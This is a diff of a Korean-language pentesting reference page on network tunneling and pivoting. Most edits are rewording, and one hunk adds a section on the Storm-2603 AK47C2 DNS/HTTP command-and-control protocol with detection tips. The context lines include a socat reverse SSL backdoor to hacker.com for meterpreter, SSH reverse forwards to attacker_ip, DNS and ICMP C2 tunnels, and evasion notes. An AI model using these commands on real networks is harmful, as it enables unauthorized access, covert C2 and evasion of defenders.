@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
+두 장치에서 **루트 권한이 필요합니다** (새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **보안 – 테라핀 공격 (CVE-2023-48795)**
-> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 변조하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
+> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
 
 ## SSHUTTLE
 
@@ -158,7 +158,7 @@ To note:
 
 - Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
 - 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
-- **관리자 권한이 필요하지 않습니다** 고포트에서 리버스 포트 포워드를 생성하는 데.
+- **리버스 포트 포워드를 생성하는 데 관리자 권한이 필요하지 않습니다**.
 
 ### rPort2Port local
 
@@ -178,7 +178,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
 **클라이언트와 서버에 동일한 버전을 사용해야 합니다.**
 
 ### socks
@@ -290,13 +290,13 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-이 줄을 희생자의 콘솔에서 마지막 줄 대신 실행하면 **비인증 프록시**를 우회할 수 있습니다:
+다음과 같이 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하여 **비인증 프록시**를 우회할 수 있습니다:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### SSL Socat 터널
 
 **/bin/sh 콘솔**
 
@@ -335,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-로컬 관리자여야 합니다 (모든 포트에 대해)
+로컬 관리자가 되어야 합니다 (모든 포트에 대해)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -364,7 +364,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-이제 공격자 머신에서 포트 1080이 수신 대기 중인지 확인하십시오:
+이제 공격자 머신에서 포트 1080이 수신 대기 중인지 확인하세요:
 ```
 netstat -antb | findstr 1080
 ```
@@ -415,13 +415,13 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성하려면 다음을 사용하십시오:
+터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**
+[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
 
 DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
 ```bash
@@ -444,13 +444,46 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Proxychains DNS 변경
+#### 프록시체인 DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2** (하드코딩됨)입니다. 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경합니다. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
 ## Go에서의 터널
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### 사용자 정의 DNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603 행위자는 *단지* 아웃바운드 **DNS** 및 **일반 HTTP POST** 트래픽을 악용하는 **이중 채널 C2 ("AK47C2")**를 생성했습니다 – 기업 네트워크에서 거의 차단되지 않는 두 가지 프로토콜입니다.
+
+1. **DNS 모드 (AK47DNS)**
+• 무작위 5자 SessionID (예: `H4T14`)를 생성합니다.  
+• *작업 요청*에는 `1`을, *결과*에는 `2`를 접두사로 붙이고 다양한 필드(플래그, SessionID, 컴퓨터 이름)를 연결합니다.  
+• 각 필드는 **ASCII 키 `VHBD@H`**로 XOR 암호화되고, 16진수로 인코딩되며 점으로 붙여져 최종적으로 공격자가 제어하는 도메인으로 끝납니다:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• 요청은 **TXT** (및 백업 **MG**) 레코드에 대해 `DnsQuery()`를 사용합니다.  
+• 응답이 0xFF 바이트를 초과하면 백도어는 데이터를 63바이트 조각으로 분할하고 마커를 삽입합니다: `s<SessionID>t<TOTAL>p<POS>` 그래서 C2 서버가 이를 재정렬할 수 있습니다.
+
+2. **HTTP 모드 (AK47HTTP)**
+• JSON 봉투를 만듭니다:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• 전체 블롭은 XOR-`VHBD@H` → 16진수 → **`POST /`**의 본문으로 전송됩니다. 헤더는 `Content-Type: text/plain`입니다.  
+• 응답은 동일한 인코딩을 따르며 `cmd` 필드는 `cmd.exe /c <command> 2>&1`로 실행됩니다.
+
+블루 팀 노트  
+• 첫 번째 레이블이 긴 16진수이고 항상 하나의 희귀 도메인으로 끝나는 비정상적인 **TXT 쿼리**를 찾으세요.  
+• 상수 XOR 키 뒤에 ASCII-16진수가 있는 것은 YARA로 쉽게 감지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 16진수).  
+• HTTP의 경우 순수 16진수이고 2바이트의 배수인 text/plain POST 본문에 플래그를 지정하세요.
+
+{{#note}}  
+전체 채널은 **표준 RFC 준수 쿼리** 내에 적합하며 각 서브 도메인 레이블을 63바이트 이하로 유지하여 대부분의 DNS 로그에서 은밀하게 유지됩니다.  
+{{#endnote}}
 
 ## ICMP 터널링
 
@@ -459,7 +492,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 soc
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 tun 어댑터를 생성하고 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -608,7 +641,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-위의 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.
+위 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.
 
 ## QEMU를 이용한 은밀한 VM 기반 터널
 
@@ -653,12 +686,12 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### 왜 이것이 탐지를 피하는가
 
 • 두 개의 서명되지 않은 실행 파일(`qemu-system-*.exe`)만이 디스크에 접근하며, 드라이버나 서비스는 설치되지 않습니다.
-• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 봅니다 (실제 C2는 VM 내부에서 종료됩니다).
+• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 감지합니다(실제 C2는 VM 내부에서 종료됨).
 • 메모리 스캐너는 악성 프로세스 공간을 분석하지 않으며, 이는 다른 OS에 존재합니다.
 
 ### Defender 팁
 
-• 사용자 쓰기 가능한 경로에 있는 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 경고합니다.
+• 사용자 쓰기 가능한 경로에 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 대한 경고를 설정합니다.
 • `qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단합니다.
 • QEMU 시작 직후 즉시 바인딩되는 드문 리스닝 포트(2222, 10022, …)를 추적합니다.
 
@@ -672,5 +705,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## 참고 문헌
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
